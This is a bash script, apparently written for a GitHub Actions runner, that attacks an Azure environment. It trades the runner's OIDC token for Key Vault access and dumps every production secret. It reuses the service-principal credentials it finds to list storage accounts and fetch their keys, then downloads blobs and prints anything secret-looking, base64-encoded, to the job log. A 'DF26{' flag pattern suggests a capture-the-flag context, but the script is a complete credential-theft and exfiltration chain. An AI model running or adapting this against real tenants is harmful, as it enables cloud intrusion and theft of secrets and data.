#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
BASE=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
LIST=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets?api-version=7.4")
for name in $(echo "$LIST"|jq -r '.value[]?.id|split("/")|last'); do
  S=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/$name?api-version=7.4")
  V=$(echo "$S"|jq -r '.value // empty'); A=$(echo "$V"|jq -r '.appId // empty' 2>/dev/null||true); P=$(echo "$V"|jq -r '.clientSecret // empty' 2>/dev/null||true); TT=$(echo "$V"|jq -r '.tenantId // empty' 2>/dev/null||true)
  [[ -n "$A" && -n "$P" && -n "$TT" ]] || continue
  AT=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
  [[ -n "$AT" ]] || continue
  RES=$(curl -sS --max-time 25 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01")
  echo "$RES" | jq -r '.value[]? | select(.type=="Microsoft.Storage/storageAccounts") | [.name,.id] | @tsv' | while IFS=$'\t' read -r acct rid; do
    [[ -n "$acct" ]] || continue
    K=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $AT" -H 'Content-Length: 0' "https://management.azure.com${rid}/listKeys?api-version=2023-01-01")
    KEY=$(echo "$K"|jq -r '.keys[0].value // empty' 2>/dev/null||true)
    say "KEY_${name}_${acct}=$([[ -n "$KEY" ]] && echo OK || echo FAIL)"
    [[ -n "$KEY" ]] || continue
    CS="DefaultEndpointsProtocol=https;AccountName=$acct;AccountKey=$KEY;EndpointSuffix=core.windows.net"
    for cont in config exports logs; do
      names=$(az storage blob list --connection-string "$CS" --container-name "$cont" --query '[].name' -o tsv --only-show-errors 2>/dev/null || true)
      say "AZLIST_${name}_${acct}_${cont}=$(printf '%s' "$names" | tr '\n' ',' | base64 -w0)"
      for bn in $names internal-config.json flag flag.txt export.json credentials.json secrets.json; do
        [[ -n "$bn" ]] || continue
        az storage blob download --connection-string "$CS" --container-name "$cont" --name "$bn" --file /tmp/b --no-progress --only-show-errors >/dev/null 2>&1 || continue
        txt=$(head -c 30000 /tmp/b | tr -d '\000')
        if echo "$txt" | grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then
          say "AZBLOB_${name}_${acct}_${cont}_${bn}_B64=$(printf '%s' "$txt" | base64 -w0)"
        fi
      done
    done
  done
done
say DONE
